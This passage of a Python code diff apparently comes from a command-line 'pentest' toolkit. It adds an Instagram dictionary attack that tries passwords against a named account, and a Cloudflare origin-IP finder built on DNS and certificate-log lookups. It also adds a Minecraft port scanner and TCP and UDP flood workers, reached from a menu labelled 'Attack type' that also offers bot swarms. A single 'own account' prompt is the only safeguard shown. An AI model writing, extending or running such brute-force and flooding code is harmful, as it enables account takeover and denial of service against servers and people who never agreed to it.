+    print(f"  {YELLOW}Run this only against YOUR OWN account.{RESET}")
+    ans = input(f"  {c(f'Start dictionary audit ({len(passwords)} attempts)? (y/N) {SYM_PROMPT} ', Fore.YELLOW)}").strip().lower()
+    if ans != "y":
+        print(f"  {c('Aborted.', Fore.RED)}")
+        print()
+        return
+
+    sess = requests.Session()
+    csrf = _insta_init_session(sess)
+    if not csrf:
+        print(f"  {RED}{SYM_X} Could not obtain CSRF token. Instagram may be blocking this network.{RESET}")
+        print()
+        return
+
+    found = False
+    found_pwd = ""
+    found_status = ""
+    total = len(passwords)
+    tested = 0
+    stopped_reason = ""
+
+    try:
+        for pwd in passwords:
+            tested += 1
+            status, detail = _insta_login_attempt(sess, user, pwd, csrf)
+            if status in ("ok", "twofa"):
+                found = True
+                found_pwd = pwd
+                found_status = status
+                break
+            if status == "ratelimit":
+                stopped_reason = f"Rate limited after {tested} attempts: {detail}"
+                print(f"\n  {YELLOW}{SYM_WARN} {stopped_reason}{RESET}")
+                print(f"  {c('Stopping the audit to avoid further blocks.', Fore.YELLOW)}")
+                break
+            if status == "checkpoint":
+                stopped_reason = f"Challenge/checkpoint after {tested} attempts: {detail}"
+                print(f"\n  {YELLOW}{SYM_WARN} {stopped_reason}{RESET}")
+                print(f"  {c('Stopping the audit — login is blocked.', Fore.YELLOW)}")
+                break
+            if status == "error":
+                stopped_reason = detail
+                print(f"\n  {YELLOW}{SYM_WARN} {detail}{RESET}")
+                break
+
+            if tested % 20 == 0 or tested == total:
+                sys.stdout.write(f"\r  {progress_bar(tested, total)}  {c(f'{tested}/{total}', Fore.CYAN)}  {c('Testing...', Fore.YELLOW)}")
+                sys.stdout.flush()
+            time.sleep(0.8)  # gentle rate
+
+        print()
+
+        if found:
+            print(f"\n  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{'='*58}{Style.RESET_ALL}")
+            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{SYM_WARN*3}  WEAK PASSWORD FOUND!  {SYM_WARN*3}{Style.RESET_ALL}")
+            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{'='*58}{Style.RESET_ALL}")
+            print(f"\n  {c(f'Account: {user}', Fore.RED)}")
+            print(f"  {c(f'Password: {found_pwd}', Fore.RED)}")
+            if found_status == "twofa":
+                print(f"  {c('Note: password accepted but 2FA is enabled.', Fore.YELLOW)}")
+            print(f"\n  {c(SYM_WARN + '  WARNING:', Fore.YELLOW)}")
+            print(f"  {c('This password is weak and was found in the dictionary!', Fore.YELLOW)}")
+            print(f"  {c('If this is YOUR account, change the password immediately.', Fore.RED)}")
+            print(f"  {c('If this is NOT your account, contact the account holder', Fore.RED)}")
+            print(f"  {c('and inform them their password has been compromised.', Fore.RED)}")
+            print(f"\n  {c('Recommendation:', Fore.GREEN)} Use a 12+ character password with")
+            print(f"  {c('uppercase, lowercase, numbers, and symbols.', Fore.GREEN)}")
+            print(f"  {c('Enable 2FA for additional security.', Fore.GREEN)}")
+            add_log_alert("CRITICAL", "Instagram Pentest", f"Weak password found for {user}: {found_pwd}")
+        elif stopped_reason:
+            print(f"\n  {YELLOW}Audit incomplete after {tested}/{total} attempts.{RESET}")
+            print(f"  {c('No verdict reached — the audit was stopped.', Fore.YELLOW)}")
+        else:
+            print(f"\n  {GREEN}{SYM_CHECK} No weak passwords found in dictionary ({tested} tried).{RESET}")
+            print(f"  {c('The account appears to have a strong password.', Fore.GREEN)}")
+            print(f"  {c('Note: Instagram rate-limiting and 2FA may have limited results.', Fore.YELLOW)}")
+
+    except KeyboardInterrupt:
+        print(f"\n  {YELLOW}Password audit interrupted.{RESET}")
+    except Exception as e:
+        print(f"  {RED}Error: {e}{RESET}")
+    print()
 
 
 # ──────────────────────────────────────────────────────────
@@ -2718,11 +3218,511 @@ def legacy_resolve(domain):
             return None
 
 
+def _is_ip(s):
+    try:
+        socket.inet_aton(s)
+        return True
+    except OSError:
+        return False
+
+
+CLOUDFLARE_RANGES = [
+    "104.16.", "104.17.", "104.18.", "104.19.", "104.20.", "104.21.", "104.22.", "104.23.",
+    "104.24.", "104.25.", "104.26.", "104.27.", "172.64.", "172.65.", "172.66.", "172.67.",
+    "173.245.", "103.21.", "103.22.", "103.31.", "141.101.", "108.162.", "190.93.", "188.114.",
+    "197.234.", "198.41.",
+]
+
+
+def _is_cloudflare(ip):
+    return any(ip.startswith(p) for p in CLOUDFLARE_RANGES)
+
+
+def _dns_parse_qname(buf, offset):
+    """Parse a (possibly compressed) DNS name. Returns (name, next_offset)."""
+    labels = []
+    ret = offset
+    cursor = offset
+    jumps = 0
+    while cursor < len(buf):
+        length = buf[cursor]
+        if length == 0:
+            if not jumps:
+                ret = cursor + 1
+            break
+        if length & 0xC0 == 0xC0:
+            if cursor + 1 >= len(buf):
+                break
+            ptr = ((length & 0x3F) << 8) | buf[cursor + 1]
+            if not jumps:
+                ret = cursor + 2
+            cursor = ptr
+            jumps += 1
+            if jumps > 20:
+                break
+            continue
+        cursor += 1
+        end = cursor + length
+        if end > len(buf):
+            break
+        labels.append(buf[cursor:end].decode("ascii", "replace"))
+        cursor = end
+    return ".".join(labels), ret
+
+
+def _dns_query(domain, qtype):
+    """Raw DNS query (no dnspython needed). Returns a list of rdata bytes for
+    answers of the requested qtype. qtype may be 'A', 'AAAA', 'SRV', 'MX',
+    'TXT', 'NS' or an int."""
+    if not domain:
+        return []
+    qtypes = {"A": 1, "NS": 2, "MX": 15, "TXT": 16, "AAAA": 28, "SRV": 33}
+    qt = qtypes.get(qtype, qtype) if isinstance(qtype, str) else qtype
+    trans_id = random.randint(0, 65535)
+    header = struct.pack(">HHHHHH", trans_id, 0x0100, 1, 0, 0, 0)
+    qname = b"".join(bytes([len(x)]) + x.encode("ascii", "replace") for x in domain.split(".")) + b"\x00"
+    packet = header + qname + struct.pack(">HH", qt, 1)
+
+    resolvers = []
+    try:
+        with open("/etc/resolv.conf") as fh:
+            for line in fh:
+                parts = line.strip().split()
+                if parts and parts[0] == "nameserver" and len(parts) >= 2 and ":" not in parts[1]:
+                    resolvers.append(parts[1])
+    except OSError:
+        pass
+    resolvers += ["8.8.8.8", "1.1.1.1"]
+
+    for rsv in resolvers:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(3)
+            s.sendto(packet, (rsv, 53))
+            data, _ = s.recvfrom(4096)
+            s.close()
+            if len(data) < 12:
+                continue
+            rid, _flags = struct.unpack(">HH", data[:4])
+            if rid != trans_id:
+                continue
+            ancount = struct.unpack(">H", data[6:8])[0]
+            if ancount == 0:
+                return []
+            off = 12
+            while off < len(data):
+                length = data[off]
+                if length == 0:
+                    off += 1
+                    break
+                if length & 0xC0 == 0xC0:
+                    off += 2
+                    break
+                off += 1 + length
+            off += 4  # skip qtype + qclass
+            answers = []
+            for _ in range(ancount):
+                _name, off = _dns_parse_qname(data, off)
+                if off + 10 > len(data):
+                    break
+                rtype, _rclass, _ttl, rdlen = struct.unpack(">HHIH", data[off:off+10])
+                off += 10
+                rdata = data[off:off+rdlen]
+                off += rdlen
+                if rtype == qt:
+                    answers.append(rdata)
+            return answers
+        except Exception:
+            continue
+    return []
+
+
+def mc_srv_lookup(domain):
+    """Java Edition SRV lookup: _minecraft._tcp.<domain> -> (host, port).
+    Returns (None, None) when no SRV record exists."""
+    srv_name = f"_minecraft._tcp.{domain}"
+    if shutil.which("dig"):
+        try:
+            r = subprocess.run(["dig", "+short", "SRV", srv_name], capture_output=True, text=True, timeout=5)
+            for line in r.stdout.strip().splitlines():
+                parts = line.split()
+                if len(parts) >= 4:
+                    try:
+                        port = int(parts[2])
+                    except ValueError:
+                        continue
+                    host = ".".join(parts[3:]).rstrip(".")
+                    if host and host != ".":
+                        return host, port
+        except Exception:
+            pass
+    for rdata in _dns_query(srv_name, "SRV"):
+        if len(rdata) < 7:
+            continue
+        _pri, _weight, port = struct.unpack(">HHH", rdata[:6])
+        host, _ = _dns_parse_qname(rdata, 6)
+        if host and host != ".":
+            return host, port
+    return None, None
+
+
+def resolve_ip_candidates(domain):
+    """Resolve a domain to all IPv4 addresses (dig preferred, getaddrinfo fallback)."""
+    if _is_ip(domain):
+        return [domain]
+    ips = []
+    if shutil.which("dig"):
+        try:
+            r = subprocess.run(["dig", "+short", "A", domain], capture_output=True, text=True, timeout=5)
+            for line in r.stdout.strip().splitlines():
+                ip = line.strip().rstrip(".")
+                try:
+                    socket.inet_aton(ip)
+                    if ip not in ips:
+                        ips.append(ip)
+                except OSError:
+                    pass
+        except Exception:
+            pass
+    if not ips:
+        try:
+            for info in socket.getaddrinfo(domain, 0, socket.AF_INET):
+                ip = info[4][0]
+                if ip not in ips:
+                    ips.append(ip)
+        except Exception:
+            pass
+    return ips
+
+
+def resolve_mc_target(target):
+    """Find the real Minecraft server address from a domain (SRV-aware).
+    Returns (ip, port, host_label) or (None, port, host_label) on failure."""
+    host = target
+    port = 25565
+    if not _is_ip(target):
+        srv_host, srv_port = mc_srv_lookup(target)
+        if srv_host:
+            host = srv_host
+            port = srv_port
+            print(f"  {c(SYM_CHECK + ' SRV record:', Fore.GREEN)} _minecraft._tcp.{target} {SYM_ARROW} {host}:{port}")
+        else:
+            print(f"  {c('No SRV record — using domain directly.', Fore.CYAN)}")
+    ips = resolve_ip_candidates(host)
+    if not ips:
+        print(f"  {c(SYM_X + ' Could not resolve', Fore.RED)} {host}")
+        return None, port, host
+    for ip in ips:
+        print(f"  {c('Resolved:', Fore.GREEN)} {host} {SYM_ARROW} {ip}")
+    if _is_cloudflare(ips[0]):
+        print(f"  {YELLOW}Cloudflare detected on resolved IP {ips[0]}.{RESET}")
+    return ips[0], port, host
+
+
+MC_PORT_RANGES = [
+    25565, 25566, 25575, 25576, 25577, 25578,
+    19132, 19133, 25564, 25567, 25568, 25569, 25570,
+    25571, 25572, 25573, 25574, 25579, 25580,
+    25585, 25590, 25595, 25600, 25650, 25700, 25750,
+    25800, 25850, 25900, 25950, 26000, 26050, 26100,
+    26150, 26200, 26250, 26300, 26350, 26400, 26450,
+    26500, 26550, 26600, 26650, 26700, 26750, 26800,
+    26850, 26900, 26950, 27000, 27015, 27050, 27100,
+    20000, 20001, 20002, 20003, 20004, 20005,
+    10000, 10001, 10002, 10003, 10004, 10005,
+    30000, 30001, 30002, 30003, 30004, 30005,
+]
+
+
+def mc_find_ports(ip, verbose=True):
+    open_ports = []
+
+    if verbose:
+        print(f"  {c('Probing common MC ports directly (for containerized/Pterodactyl servers)...', Fore.CYAN)}")
+
+    def _probe(port, results, idx):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1.5)
+            r = s.connect_ex((ip, port))
+            s.close()
+            results[idx] = port if r == 0 else None
+        except Exception:
+            results[idx] = None
+
+    batch_size = 100
+    for batch_start in range(0, len(MC_PORT_RANGES), batch_size):
+        batch = MC_PORT_RANGES[batch_start:batch_start + batch_size]
+        br = {}
+        with ThreadPoolExecutor(max_workers=100) as ex:
+            fs = {ex.submit(_probe, p, br, i): i for i, p in enumerate(batch)}
+            for f in as_completed(fs):
+                try: f.result()
+                except Exception: pass
+        for i, p in enumerate(batch):
+            if br.get(i) is not None:
+                open_ports.append(p)
+
+    try:
+        nmap_has = shutil.which("nmap")
+        if nmap_has:
+            if verbose:
+                print(f"  {c('Running full port scan via nmap -T4 -p- (streaming output)...', Fore.YELLOW)}")
+            proc = subprocess.Popen(
+                ["nmap", "-T4", "-Pn", "-p-", ip],
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+            )
+            def _nmap_reader(results):
+                for line in iter(proc.stdout.readline, ''):
+                    line_s = line.rstrip()
+                    if not line_s: continue
+                    m = re.match(r'^(\d+)/tcp\s+open', line_s)
+                    if m:
+                        p = int(m.group(1))
+                        if len(results) <= 20:
+                            print(f"    {line_s}")
+                        elif len(results) == 21:
+                            print(f"    {DIM}... ({c('firewall? all ports show open', Fore.RED)}){RESET}")
+                        if len(results) <= 1000:
+                            results.append(p)
+                    else:
+                        print(f"    {line_s}")
+            open_nmap = []
+            rt = threading.Thread(target=_nmap_reader, args=(open_nmap,), daemon=True)
+            rt.start()
+            proc.wait(timeout=600)
+            rt.join(timeout=5)
+            if len(open_nmap) > 1000:
+                if verbose:
+                    print(f"  {c(SYM_WARN + f' {len(open_nmap)} ports reported open — firewall false positive, ignoring.', Fore.RED)}")
+            else:
+                for p in open_nmap:
+                    if p not in open_ports:
+                        open_ports.append(p)
+    except subprocess.TimeoutExpired:
+        if verbose:
+            print(f"  {c('nmap full scan timed out. Killing...', Fore.RED)}")
+        proc.kill()
+        proc.wait()
+    except Exception:
+        pass
+
+    open_ports.sort()
+    if verbose and open_ports:
+        if len(open_ports) <= 30:
+            print(f"  {c('Open ports:', Fore.GREEN)} {c(str(open_ports), Fore.CYAN)}")
+        else:
+            print(f"  {c(f'Open ports ({len(open_ports)}):', Fore.GREEN)} {c(str(open_ports[:20]), Fore.CYAN)}{DIM}...{RESET}")
+    elif verbose:
+        print(f"  {c('No MC ports detected. Try entering the port manually.', Fore.YELLOW)}")
+    return open_ports
+
+
+def find_real_ip(domain):
+    header_box(f"Real IP Finder: {domain}", Fore.YELLOW)
+    origin_ips = []
+
+    try:
+        socket.inet_aton(domain)
+        print(f"  {c('Already an IP address.', Fore.GREEN)}")
+        return domain
+    except OSError:
+        pass
+
+    cf_ips = set()
+    try:
+        r = subprocess.run(["dig", "+short", domain], capture_output=True, text=True, timeout=10)
+        for line in r.stdout.strip().splitlines():
+            line = line.strip().rstrip('.')
+            try:
+                socket.inet_aton(line)
+                cf_ips.add(line)
+            except OSError:
+                pass
+    except Exception:
+        pass
+
+    is_cf = False
+    cf_ranges = ["104.16.", "104.17.", "104.18.", "104.19.", "104.20.", "104.21.", "104.22.", "104.23.",
+                 "104.24.", "104.25.", "104.26.", "104.27.", "172.64.", "172.65.", "172.66.", "172.67.",
+                 "173.245.", "103.21.", "103.22.", "103.31.", "141.101.", "108.162.", "190.93.", "188.114.",
+                 "197.234.", "198.41."]
+    for ip in cf_ips:
+        for prefix in cf_ranges:
+            if ip.startswith(prefix):
+                is_cf = True
+                break
+        if is_cf:
+            break
+
+    if is_cf:
+        print(f"  {c(SYM_WARN + ' Cloudflare detected!', Fore.RED)} Current IP: {c(list(cf_ips)[0], Fore.YELLOW)}")
+        print(f"  {c('Searching for origin IP...', Fore.CYAN)}")
+    else:
+        print(f"  {c('IPs:', Fore.GREEN)} {', '.join(cf_ips)}")
+
+    print(f"\n  {c('Checking DNS history and records...', Fore.CYAN)}")
+    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
+
+    for prefix in ["", "mail.", "smtp.", "ftp.", "cpanel.", "webdisk.", "autodiscover."]:
+        sub = prefix + domain
+        try:
+            ips = subprocess.run(["dig", "+short", sub], capture_output=True, text=True, timeout=5)
+            for line in ips.stdout.strip().splitlines():
+                line = line.strip().rstrip('.')
+                try:
+                    socket.inet_aton(line)
+                    if line not in cf_ips:
+                        origin_ips.append((f"DNS:{sub}", line))
+                        print(f"    {c(f'DNS:{sub}', Fore.GREEN)} {SYM_ARROW} {c(line, Fore.YELLOW)}")
+                except OSError:
+                    pass
+        except Exception:
+            pass
+
+    try:
+        mx = subprocess.run(["dig", "+short", "MX", domain], capture_output=True, text=True, timeout=10)
+        for line in mx.stdout.strip().splitlines():
+            parts = line.strip().split()
+            if len(parts) >= 2:
+                mx_host = parts[1].strip().rstrip('.')
+                mx_ips = subprocess.run(["dig", "+short", mx_host], capture_output=True, text=True, timeout=5)
+                for mip in mx_ips.stdout.strip().splitlines():
+                    mip = mip.strip().rstrip('.')
+                    try:
+                        socket.inet_aton(mip)
+                        if mip not in cf_ips:
+                            origin_ips.append((f"MX:{mx_host}", mip))
+                            print(f"    {c(f'MX:{mx_host}', Fore.GREEN)} {SYM_ARROW} {c(mip, Fore.YELLOW)}")
+                    except OSError:
+                        pass
+    except Exception:
+        pass
+
+    try:
+        txt = subprocess.run(["dig", "+short", "TXT", domain], capture_output=True, text=True, timeout=10)
+        for line in txt.stdout.strip().splitlines():
+            for part in re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', line):
+                try:
+                    socket.inet_aton(part)
+                    if part not in cf_ips:
+                        origin_ips.append((f"TXT:{domain}", part))
+                        print(f"    {c(f'TXT record', Fore.GREEN)} {SYM_ARROW} {c(part, Fore.YELLOW)}")
+                except OSError:
+                    pass
+    except Exception:
+        pass
+
+    try:
+        spf = subprocess.run(["dig", "+short", "TXT", f"spf._dmarc.{domain}"], capture_output=True, text=True, timeout=5)
+        for line in spf.stdout.strip().splitlines():
+            for part in re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', line):
+                try:
+                    socket.inet_aton(part)
+                    if part not in cf_ips:
+                        origin_ips.append(("DMARC", part))
+                        print(f"    {c('DMARC record', Fore.GREEN)} {SYM_ARROW} {c(part, Fore.YELLOW)}")
+                except OSError:
+                    pass
+    except Exception:
+        pass
+
+    try:
+        ns = subprocess.run(["dig", "+short", "NS", domain], capture_output=True, text=True, timeout=10)
+        for line in ns.stdout.strip().splitlines():
+            ns_host = line.strip().rstrip('.')
+            if ns_host and domain not in ns_host:
+                ns_ips = subprocess.run(["dig", "+short", ns_host], capture_output=True, text=True, timeout=5)
+                for nip in ns_ips.stdout.strip().splitlines():
+                    nip = nip.strip().rstrip('.')
+                    try:
+                        socket.inet_aton(nip)
+                        if nip not in cf_ips:
+                            origin_ips.append((f"NS:{ns_host}", nip))
+                            print(f"    {c(f'NS:{ns_host}', Fore.GREEN)} {SYM_ARROW} {c(nip, Fore.YELLOW)}")
+                    except OSError:
+                        pass
+    except Exception:
+        pass
+
+    print(f"\n  {c('Scanning Certificate Transparency (crt.sh)...', Fore.CYAN)}")
+    try:
+        r = requests.get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=15)
+        if r.status_code == 200:
+            data = r.json()
+            seen = set()
+            for entry in data[:200]:
+                names = entry.get("name_value", "").split("\n")
+                for name in names:
+                    name = name.strip().lower()
+                    if name.endswith(f".{domain}") or name == domain:
+                        if name not in seen:
+                            seen.add(name)
+                            try:
+                                rs = subprocess.run(["dig", "+short", name], capture_output=True, text=True, timeout=5)
+                                for line in rs.stdout.strip().splitlines():
+                                    line = line.strip().rstrip(".")
+                                    try:
+                                        socket.inet_aton(line)
+                                        if line not in cf_ips and line not in [x[1] for x in origin_ips]:
+                                            origin_ips.append((f"CT:{name}", line))
+                                            print(f"    {c(f'CT:{name}', Fore.GREEN)} {SYM_ARROW} {c(line, Fore.YELLOW)}")
+                                    except: pass
+                            except: pass
+            print(f"  {c(f'Scanned {len(seen)} subdomains from CT logs', Fore.GREEN)}")
+    except Exception as e:
+        print(f"  {RED}crt.sh error: {e}{RESET}")
+
+    print(f"\n  {c('Trying HTTP host-header leak...', Fore.CYAN)}")
+    for scheme in ["http", "https"]:
+        for port in [80, 443, 8080, 8443]:
+            try:
+                url = f"{scheme}://{domain}"
+                r = requests.get(url, timeout=5, allow_redirects=False,
+                    headers={"Host": f"nonexistent.{domain}"},
+                    verify=False)
+                if r.headers.get("Server") or r.status_code < 500:
+                    pass
+            except Exception:
+                pass
+
+    try:
+        r = requests.get(f"https://api.hackertarget.com/dnslookup/?q={domain}", timeout=10)
+        if r.status_code == 200:
+            for line in r.text.strip().splitlines():
+                for part in re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', line):
+                    try:
+                        socket.inet_aton(part)
+                        if part not in cf_ips and part not in [x[1] for x in origin_ips]:
+                            origin_ips.append(("HackerTarget", part))
+                            print(f"    {c('HackerTarget', Fore.GREEN)} {SYM_ARROW} {c(part, Fore.YELLOW)}")
+                    except OSError:
+                        pass
+    except Exception:
+        pass
+
+    print(f"\n{Fore.CYAN}{'─'*50}{RESET}")
+    if origin_ips:
+        unique_ips = list(dict.fromkeys(ip for _, ip in origin_ips))
+        print(f"\n  {c(SYM_CHECK + ' Possible origin IPs found:', Fore.GREEN)}")
+        for source, ip in origin_ips:
+            print(f"    {c(f'{source:25s}', Fore.CYAN)} {c(ip, Fore.YELLOW)}")
+        real_ip = unique_ips[0]
+        print(f"\n  {c('Best candidate:', Fore.GREEN)} {c(real_ip, Fore.YELLOW)}")
+        return real_ip
+    else:
+        print(f"  {c('No origin IP found via passive methods.', Fore.YELLOW)}")
+        print(f"  {c('The domain may be fully proxied. Try manual investigation.', Fore.YELLOW)}")
+        ip_list = ", ".join(cf_ips)
+        print(f"  {c(f'Resolved IPs: {ip_list}', Fore.CYAN)}")
+        return list(cf_ips)[0] if cf_ips else None
+
+
 def legacy_nmap(target):
     header_box(f"Port Scan: {target}", Fore.MAGENTA)
     open_ports = []
     try:
-        r = subprocess.run(["nmap", "-T4", "-F", target], capture_output=True, text=True, timeout=120)
+        r = subprocess.run(["nmap", "-T4", "-Pn", "-F", target], capture_output=True, text=True, timeout=120)
         for line in r.stdout.splitlines():
             m = re.match(r'^(\d+)/tcp\s+open', line)
             if m: open_ports.append(int(m.group(1)))
@@ -2730,7 +3730,7 @@ def legacy_nmap(target):
         pass
     try:
         mc_str = ",".join(str(p) for p in MINECRAFT_PORTS)
-        r = subprocess.run(["nmap", "-T4", "-p", mc_str, target], capture_output=True, text=True, timeout=60)
+        r = subprocess.run(["nmap", "-T4", "-Pn", "-p", mc_str, target], capture_output=True, text=True, timeout=60)
         for line in r.stdout.splitlines():
             m = re.match(r'^(\d+)/tcp\s+open', line)
             if m:
@@ -2752,88 +3752,324 @@ def legacy_nmap(target):
     return open_ports
 
 
-def _mc_read_varint(sock):
-    v = 0
-    for i in range(5):
-        b = sock.recv(1)
-        if not b:
-            return None
-        v |= (b[0] & 0x7F) << (7 * i)
-        if not (b[0] & 0x80):
-            break
-    return v
+def _mc_build_handshake(ip, port):
+    return _mc_packet(0x00, _mc_varint(764), _mc_pstr(ip), port.to_bytes(2, "big"), _mc_varint(2))
 
 
-def mc_worker(ip, port, results, idx):
+def _mc_build_login(name=None):
+    if name is None:
+        name = f"Bot_{random.randint(10000,99999)}_{random.choice(['X','Pro','YT','OP','HD'])}"
+    return _mc_packet(0x00, _mc_pstr(name))
+
+
+def mc_tcp_flood_worker(ip, port, duration, results, idx, mode="rapid"):
+    sent = 0
+    errs = 0
+    end = time.time() + duration
+    hs = _mc_build_handshake(ip, port)
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(5.0)
-        s.connect((ip, port))
-        handshake = _mc_packet(0x00, _mc_varint(764), _mc_pstr(ip), port.to_bytes(2, "big"), _mc_varint(2))
-        s.sendall(handshake)
-        username = f"Stress_{random.randint(10000,99999)}_{random.choice(['X','Pro','YT','OP','HD'])}"
-        login = _mc_packet(0x00, _mc_pstr(username))
-        s.sendall(login)
-        end = time.time() + 4
+        while time.time() < end:
+            s = None
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                s.settimeout(3)
+                s.connect((ip, port))
+                s.sendall(hs)
+                s.sendall(_mc_build_login())
+                sent += 1
+                results[idx] = (sent, errs)
+            except Exception:
+                errs += 1
+                results[idx] = (sent, errs)
+                if s:
+                    try: s.close()
+                    except Exception: pass
+                continue
+            if mode == "rapid":
+                try: s.close()
+                except Exception: pass
+            else:
+                end2 = min(time.time() + 2, end)
+                while time.time() < end2:
+                    try:
+                        s.settimeout(0.5)
+                        plen = _mc_read_varint(s)
+                        if plen is None: break
+                        pid = _mc_read_varint(s)
+                        if pid is None: break
+                        rest = plen - len(_mc_varint(pid))
+                        data = b""
+                        while len(data) < rest:
+                            chunk = s.recv(rest - len(data))
+                            if not chunk: break
+                            data += chunk
+                        if pid == 0x21:
+                            s.sendall(_mc_packet(0x0F, data))
+                            sent += 1
+                            results[idx] = (sent, errs)
+                    except socket.timeout:
+                        continue
+                    except Exception:
+                        break
+                try: s.close()
+                except Exception: pass
+        results[idx] = (sent, errs)
+    except Exception:
+        results[idx] = (sent, errs)
+
+
+def mc_udp_flood_worker(ip, port, duration, results, idx, mode="rapid"):
+    sent = 0
+    errs = 0
+    end = time.time() + duration
+    RAKNET_MAGIC = b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         while time.time() < end:
             try:
-                s.settimeout(1)
-                plen = _mc_read_varint(s)
-                if plen is None:
-                    break
-                pid = _mc_read_varint(s)
-                if pid is None:
-                    break
-                rest = plen - len(_mc_varint(pid))
-                data = b""
-                while len(data) < rest:
-                    chunk = s.recv(rest - len(data))
-                    if not chunk:
-                        break
-                    data += chunk
-                if pid == 0x21:
-                    s.sendall(_mc_packet(0x0F, data))
-            except socket.timeout:
-                continue
+                timestamp = struct.pack(">Q", int(time.time() * 1000))
+                payload = b"\x01" + timestamp + RAKNET_MAGIC + os.urandom(8)
+                s.sendto(payload, (ip, port))
+                sent += 1
+                if sent % 100 == 0:
+                    results[idx] = (sent, errs)
             except Exception:
-                break
-        s.close()
-        results[idx] = 1
+                errs += 1
+                results[idx] = (sent, errs)
+        results[idx] = (sent, errs)
     except Exception:
-        results[idx] = 0
+        results[idx] = (sent, errs)
+
+
+def _probe_online(ip, port, timeout=3):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect((ip, port))
+        s.close()
+        return True
+    except Exception:
+        return False
 
 
 def stress_minecraft():
     header_box("Minecraft Stress Test", Fore.RED)
     target = input(f"  {c(f'Server IP or domain {SYM_PROMPT} ', Fore.CYAN)}").strip()
     if not target: return
-    ip = legacy_resolve(target)
+    ip, srv_port, real_host = resolve_mc_target(target)
     if not ip: return
-    ports = legacy_nmap(ip) or []
+
+    is_cf = _is_cloudflare(ip)
+    if is_cf:
+        ans = input(f"  {YELLOW}Cloudflare detected! Enter real origin IP if known (or press Enter to auto-scan): {SYM_PROMPT} {RESET}").strip()
+        if ans:
+            ip = ans
+            print(f"  {c(f'Using manual IP: {ip}', Fore.GREEN)}")
+        else:
+            print(f"  {c('Auto-scanning for real origin IP...', Fore.YELLOW)}")
+            real_ips = []
+            with ThreadPoolExecutor(max_workers=1) as ex:
+                fut = ex.submit(cf_bypass, target, False)
+                try:
+                    real_ips = fut.result(timeout=60)
+                except _CF_TimeoutError:
+                    print(f"  {c('Scan timed out.', Fore.RED)}")
+            if real_ips:
+                ip = real_ips[0]
+                print(f"  {c(f'Found origin IP: {ip}', Fore.GREEN)}")
+            else:
+                print(f"  {c('No origin IP found. Attack may not work through Cloudflare.', Fore.RED)}")
+
+    print(f"  {c('Scanning for Minecraft ports...', Fore.CYAN)}")
+    ports = mc_find_ports(ip)
     if ports:
-        p_in = input(f"  {c(f'Port (default 25565) {SYM_PROMPT} ', Fore.CYAN)}").strip()
-        port = int(p_in) if p_in.isdigit() else 25565
+        print(f"  {c('Found MC ports:', Fore.GREEN)} {c(str(ports), Fore.CYAN)}")
     else:
-        p_in = input(f"  {c(f'Port (default 25565) {SYM_PROMPT} ', Fore.CYAN)}").strip()
-        port = int(p_in) if p_in.isdigit() else 25565
-    n_in = input(f"  {c(f'Packets (default 500) {SYM_PROMPT} ', Fore.CYAN)}").strip()
-    num = int(n_in) if n_in.isdigit() else 500
-    start = time.time(); sent = 0; done = 0; bs = 1600
-    try:
-        for b in range(0, num, bs):
-            be = min(b + bs, num); batch = list(range(b, be)); br = {}
-            with ThreadPoolExecutor(max_workers=200) as ex:
-                fs = {ex.submit(mc_worker, ip, port, br, i): i for i in batch}
-                for f in as_completed(fs): f.result()
-            for v in br.values(): sent += v; done += 1
-            p = f"{progress_bar(min(done, num), num)}  S:{sent}  E:{done-sent}"
-            sys.stdout.write(f"\r{p:60s}")
-            sys.stdout.flush()
-        print()
-    except KeyboardInterrupt: print(f"\n  {YELLOW}Interrupted.{RESET}")
-    el = time.time() - start
-    rat = sent / el if el > 0 else 0
-    print(f"\n  {c(SYM_CHECK + ' Complete!', Fore.GREEN)} {c(str(sent), Fore.CYAN)} pkts in {c(f'{el:.1f}s', Fore.CYAN)} ({c(f'{rat:.1f} pkt/s', Fore.MAGENTA)})\n")
+        print(f"  {c('No MC ports auto-detected (nmap may not see containerized servers).', Fore.YELLOW)}")
+
+    p_in = input(f"  {c(f'Port (default {srv_port}) {SYM_PROMPT} ', Fore.CYAN)}").strip()
+    port = int(p_in) if p_in.isdigit() else srv_port
+
+    print(f"\n  {c('Attack type:', Fore.CYAN)}")
+    print(f"  {c('[1]', Fore.GREEN)}  Bot attack (Node.js mineflayer bots)")
+    print(f"  {c('[2]', Fore.GREEN)}  TCP flood")
+    print(f"  {c('[3]', Fore.GREEN)}  UDP flood (Bedrock)")
+    print(f"  {c('[4]', Fore.GREEN)}  Both (bots + flood)")
+    at = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
+    if at not in ("1", "2", "3", "4"):
+        print(f"  {RED}Invalid choice.{RESET}")
+        return
+
+    bot_enabled = at in ("1", "4")
+    flood_enabled = at in ("2", "3", "4")
+
+    bc = 0; bd = 0; ft = "r"; dur = 30; cc = 500
+
+    if bot_enabled:
+        _ensure_mineflayer()
+        b_in = input(f"  {c(f'Bot count (default 20) {SYM_PROMPT} ', Fore.CYAN)}").strip()
+        bc = int(b_in) if b_in.isdigit() else 20
+        bd_in = input(f"  {c(f'Bot duration seconds (default 30) {SYM_PROMPT} ', Fore.CYAN)}").strip()
+        bd = int(bd_in) if bd_in.isdigit() else 30
+
+    if flood_enabled:
+        print(f"\n  {c('Flood type:', Fore.CYAN)}")
